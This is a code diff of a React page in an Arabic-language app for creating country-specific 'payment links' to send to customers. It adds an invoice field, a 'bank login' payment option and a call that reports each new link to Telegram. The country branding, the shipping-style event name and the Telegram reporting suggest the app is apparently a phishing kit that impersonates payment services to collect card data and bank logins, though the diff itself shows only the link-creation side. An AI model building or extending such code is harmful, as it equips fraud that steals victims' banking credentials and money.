@@ -12,6 +12,7 @@ import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countr
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
+import { sendToTelegram } from "@/lib/telegram";
 import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import TelegramTest from "@/components/TelegramTest";
@@ -32,19 +33,28 @@ const CreatePaymentLink = () => {
   const createLink = useCreateLink();
   const countryData = getCountryByCode(country?.toUpperCase() || "");
 
+  const [invoiceNumber, setInvoiceNumber] = useState("");
   const [paymentAmount, setPaymentAmount] = useState("500");
   const [paymentMethod, setPaymentMethod] = useState("card");
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
   const [linkId, setLinkId] = useState("");
 
+  const serviceBranding = getServiceBranding('payment');
+  const paymentTheme = {
+    primary: serviceBranding.colors.primary,
+    secondary: serviceBranding.colors.secondary,
+    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
+    bgLight: "#f5f3ff"
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!paymentAmount) {
+    if (!invoiceNumber || !paymentAmount) {
       toast({
         title: "خطأ",
-        description: "الرجاء إدخال مبلغ السداد",
+        description: "الرجاء إكمال جميع البيانات",
         variant: "destructive",
       });
       return;
@@ -55,9 +65,11 @@ const CreatePaymentLink = () => {
         type: "payment",
         country_code: country || "",
         payload: {
+          invoice_number: invoiceNumber,
           payment_amount: parseFloat(paymentAmount) || 500,
           payment_method: paymentMethod,
           selectedCountry: country || "SA",
+          service_key: "payment",
         },
       });
 
@@ -71,6 +83,23 @@ const CreatePaymentLink = () => {
       setCreatedPaymentUrl(paymentUrl);
       setLinkId(link.id);
       setShowSuccessDialog(true);
+
+      // إرسال معلومات إنشاء الرابط إلى تيليجرام
+      await sendToTelegram({
+        type: 'shipping_link_created',
+        data: {
+          linkId: link.id,
+          serviceKey: 'payment',
+          serviceName: 'خدمة السداد',
+          invoice_number: invoiceNumber,
+          payment_amount: parseFloat(paymentAmount) || 500,
+          payment_method: paymentMethod === 'card' ? 'دفع بالبطاقة' : 'تسجيل دخول البنك',
+          country: countryData?.nameAr || country,
+          currency: getCurrencySymbol(country || 'SA'),
+          payment_url: paymentUrl,
+        },
+        timestamp: new Date().toISOString()
+      });
 
       toast({
         title: "تم إنشاء رابط السداد بنجاح!",
@@ -89,19 +118,21 @@ const CreatePaymentLink = () => {
 
   if (!countryData) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+      <div className="min-h-screen flex items-center justify-center" dir="rtl" style={{ background: paymentTheme.bgLight }}>
         <div className="text-center p-8">
-          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
+          <CreditCard className="w-16 h-16 mx-auto mb-4" style={{ color: paymentTheme.primary }} />
+          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
           <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
+          <Button onClick={() => navigate('/services')} style={{ background: paymentTheme.gradient, color: 'white' }}>
+            العودة للخدمات
+          </Button>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+    <div className="min-h-screen py-4" dir="rtl" style={{ background: `linear-gradient(to bottom, ${paymentTheme.bgLight}, white)` }}>
       <div className="container mx-auto px-4">
         {/* Telegram Test Component */}
         <div className="mb-6">
@@ -109,27 +140,48 @@ const CreatePaymentLink = () => {
         </div>
 
         <div className="max-w-2xl mx-auto">
-          <Card className="p-4 shadow-elevated">
+          <Card className="p-4 shadow-xl border-2" style={{ borderColor: `${paymentTheme.primary}20` }}>
             <div
-              className="h-16 -m-4 mb-4 rounded-t-xl relative"
-              style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-              }}
+              className="h-20 -m-4 mb-4 rounded-t-xl relative overflow-hidden"
+              style={{ background: paymentTheme.gradient }}
             >
-              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
-              <div className="absolute bottom-2 right-4 text-white">
-                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
-                <p className="text-xs opacity-90">{countryData.nameAr}</p>
+              <div className="absolute inset-0 bg-black/10" />
+              <div className="absolute inset-0 flex items-center justify-between px-6">
+                <div className="text-white">
+                  <div className="flex items-center gap-2 mb-1">
+                    <CreditCard className="w-6 h-6" />
+                    <h1 className="text-xl font-bold">خدمة الدفع</h1>
+                  </div>
+                  <p className="text-sm opacity-90">إنشاء رابط سداد - {countryData.nameAr}</p>
+                </div>
+                <div className="text-4xl">💳</div>
               </div>
             </div>
 
-            <form onSubmit={handleSubmit} className="space-y-4">
+            <form onSubmit={handleSubmit} className="space-y-5">
+
+              {/* Invoice Number */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
+                  <Hash className="w-4 h-4" />
+                  الرقم المفوتر *
+                </Label>
+                <Input
+                  type="text"
+                  value={invoiceNumber}
+                  onChange={(e) => setInvoiceNumber(e.target.value)}
+                  placeholder="INV-12345"
+                  className="h-12 text-base border-2"
+                  style={{ borderColor: `${paymentTheme.primary}30` }}
+                  required
+                />
+              </div>
 
               {/* Payment Amount */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <DollarSign className="w-3 h-3" />
-                  مبلغ السداد
+                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
+                  <DollarSign className="w-4 h-4" />
+                  المبلغ *
                   {country && (
                     <span className="text-xs text-muted-foreground">
                       ({getCurrencyName(country)})
@@ -141,9 +193,11 @@ const CreatePaymentLink = () => {
                   value={paymentAmount}
                   onChange={(e) => setPaymentAmount(e.target.value)}
                   placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
-                  className="h-9 text-sm"
+                  className="h-12 text-base border-2 font-semibold"
+                  style={{ borderColor: `${paymentTheme.primary}30` }}
                   step="0.01"
                   min="0"
+                  required
                 />
                 {country && (
                   <p className="text-xs text-muted-foreground mt-1">
@@ -154,19 +208,25 @@ const CreatePaymentLink = () => {
 
               {/* Payment Method Selection */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <CreditCard className="w-3 h-3" />
+                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
+                  <CreditCard className="w-4 h-4" />
                   طريقة الدفع *
                 </Label>
                 <Select value={paymentMethod} onValueChange={setPaymentMethod}>
-                  <SelectTrigger className="h-10">
+                  <SelectTrigger className="h-12 border-2" style={{ borderColor: `${paymentTheme.primary}30` }}>
                     <SelectValue placeholder="اختر طريقة الدفع" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
                     <SelectItem value="card">
                       <div className="flex items-center gap-2">
                         <CreditCard className="w-4 h-4" />
-                        <span>بيانات البطاقة</span>
+                        <span>دفع بالبطاقة</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="bank_login">
+                      <div className="flex items-center gap-2">
+                        <Building2 className="w-4 h-4" />
+                        <span>دفع بتسجيل الدخول للبنك</span>
                       </div>
                     </SelectItem>
                   </SelectContent>
@@ -175,14 +235,18 @@ const CreatePaymentLink = () => {
 
               <Button
                 type="submit"
-                size="lg"
-                className="w-full h-11 text-white mt-6"
-                style={{
-                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
-                }}
-                disabled={createLink.isPending}
+                className="w-full py-7 text-lg font-bold shadow-lg text-white mt-8 hover:shadow-xl transition-all"
+                style={{ background: paymentTheme.gradient }}
+                disabled={createLink.isPending || !invoiceNumber || !paymentAmount}
               >
-                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
+                {createLink.isPending ? (
+                  <span>جاري الإنشاء...</span>
+                ) : (
+                  <>
+                    <CreditCard className="w-5 h-5 ml-2" />
+                    <span>إنشاء رابط السداد</span>
+                  </>
+                )}
               </Button>
             </form>
           </Card>
@@ -190,30 +254,68 @@ const CreatePaymentLink = () => {
 
         {/* Success Dialog */}
         <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-          <AlertDialogContent className="sm:max-w-md" dir="rtl">
+          <AlertDialogContent className="sm:max-w-md border-2" style={{ borderColor: paymentTheme.primary }} dir="rtl">
             <AlertDialogHeader>
-              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
+              <AlertDialogTitle className="text-right text-xl flex items-center gap-2">
+                <CreditCard className="w-6 h-6" style={{ color: paymentTheme.primary }} />
+                <span>تم إنشاء رابط السداد بنجاح!</span>
+              </AlertDialogTitle>
               <AlertDialogDescription className="text-right">
                 يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
               </AlertDialogDescription>
             </AlertDialogHeader>
+            
+            <div className="my-4">
+              <div className="p-4 rounded-lg mb-4" style={{ background: paymentTheme.bgLight }}>
+                <div className="space-y-2 text-sm">
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">الرقم المفوتر:</span>
+                    <span className="font-semibold">{invoiceNumber}</span>
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">المبلغ:</span>
+                    <span className="font-bold text-lg" style={{ color: paymentTheme.primary }}>
+                      {formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">طريقة الدفع:</span>
+                    <span className="font-semibold">
+                      {paymentMethod === 'card' ? 'دفع بالبطاقة' : 'تسجيل دخول البنك'}
+                    </span>
+                  </div>
+                </div>
+              </div>
+
+              <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
+                {createdPaymentUrl}
+              </div>
+            </div>
+            
             <AlertDialogFooter className="flex flex-row gap-2 justify-start">
               <Button
                 variant="outline"
-                onClick={() => window.open(createdPaymentUrl, '_blank')}
-                className="flex-1"
-              >
-                <ExternalLink className="w-4 h-4 ml-2" />
-                معاينة الرابط
-              </Button>
-              <AlertDialogAction
                 onClick={() => {
-                  navigate(`/pay/${linkId}/data`);
+                  navigator.clipboard.writeText(createdPaymentUrl);
+                  toast({
+                    title: "تم النسخ!",
+                    description: "تم نسخ الرابط إلى الحافظة",
+                  });
                 }}
                 className="flex-1"
+                style={{ borderColor: paymentTheme.primary, color: paymentTheme.primary }}
               >
-                إدخال بيانات السداد
-              </AlertDialogAction>
+                <Copy className="w-4 h-4 ml-2" />
+                نسخ الرابط
+              </Button>
+              <Button
+                onClick={() => window.open(createdPaymentUrl, '_blank')}
+                className="flex-1"
+                style={{ background: paymentTheme.gradient }}
+              >
+                <ExternalLink className="w-4 h-4 ml-2" />
+                معاينة
+              </Button>
             </AlertDialogFooter>
           </AlertDialogContent>
         </AlertDialog>
